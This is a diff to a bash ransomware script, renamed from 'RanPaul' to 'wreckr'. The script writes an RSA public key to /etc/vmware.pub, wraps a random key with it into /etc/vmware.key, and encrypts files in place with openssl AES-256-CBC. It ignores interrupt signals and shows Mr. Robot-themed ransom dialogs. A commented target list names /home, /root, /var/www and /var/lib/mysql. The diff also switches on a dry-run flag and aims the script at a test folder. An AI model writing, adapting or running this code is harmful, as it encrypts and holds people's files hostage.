@@ -3,6 +3,9 @@
 ERRMSG=""
 OS=""
 ################ CHECKS ###############################
+PROGRAM_NAME="wreckr"
+PROGRAM_VERSION="0.0.1"
+
 get_os() {
 	if [[$(uname -s | grep Linux) != ""]]; then
 		OS="linux"
@@ -57,10 +60,11 @@ exit
 init() {
 	check_req
 	check_msg
-	KEY="$RANDOM""RanPaul$RANDOM"
+	KEY="$RANDOM$RANDOM$RANDOM"
 	pubkey="-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4euqwCPkVQYx/hsukQeq\nFTpnda31RI3TNTL8T4ZiU63LYncuKwqIO6Uj9h398U7NCG4TUbBgO9JkcPB10x++\nEvrjxAMMLLCVd+Kxo2CTy/wuk2sIycZjH4PTc5yQYV9hRHkaVs311VjkQHeUcC6x\nPFm5obeTpIUKC8t8FFZ2NiTS6ZMxQmUEhEbabP4VvsilqY/LaX1KzoskRHarZywy\nHfPVKfzffKR2DJ8BmUvh8BXOW/hsrLfUMfXnLfHxQLAo27H3IM457X23wqgDWdMp\npIetu54guYDbCPQNv8ERI8LX3v0n+XLdLqKFpcvramB7pLf6aX2m2VC4ozrv/Yju\njQIDAQAB\n-----END PUBLIC KEY-----"
 	echo "$pubkey" > /etc/vmware.pub
-	dec
+	PRIVATEKEY="/etc/vmware.key"
+	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "/etc/vmware.pub" -out $PRIVATEKEY
 }
 navdir() {
 for fil in $1; do
@@ -81,7 +85,7 @@ case "$DIALOG" in
 	read result
 	;;
 *)
-	$DIALOG --backtitle "RanPaul 0.0.1" \
+	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
        		--title "$1" \
        		--yesno "$2" 18 60
         result=$?
@@ -93,11 +97,11 @@ Yes|Y|y)
 	break
 	;;
 0)
-	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
+	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
 	break
 	;;	
 1)
-	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
+	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
 	EXIT
 	;;	
 *)
@@ -109,12 +113,12 @@ esac
 ############### ENCRYPTING ###########################
 pck() {
 	if [ "$SOFT" = "" ]; then
-	if [ -f "$1" ]; then
-	openfile $1
-	stuff=$(cat $1)
-	echo "RAN" > $1
-	echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
-	fi
+		if [ -f "$1" ]; then
+			openfile $1
+			stuff=$(cat $1)
+			echo "RAN" > $1
+			echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
+		fi
 	fi
 }
 enc_loop() {
@@ -128,10 +132,6 @@ enc_loop() {
 	done
 }
 ################## DECRYPT ################################
-dec() {
-	PRIVATEKEY="/etc/vmware.key"
-	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "/etc/vmware.pub" -out $PRIVATEKEY
-}
 upk() {
 	if [ "$SOFT" = "" ]; then
 	openfile $1
@@ -179,7 +179,7 @@ breakcom() {
 main() {
 	trap '' INT
 	trap '' TERM
-	#SOFT="YES"
+	SOFT="YES"
 	init
 	targets="/root/Desktop/testing"
 	#targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
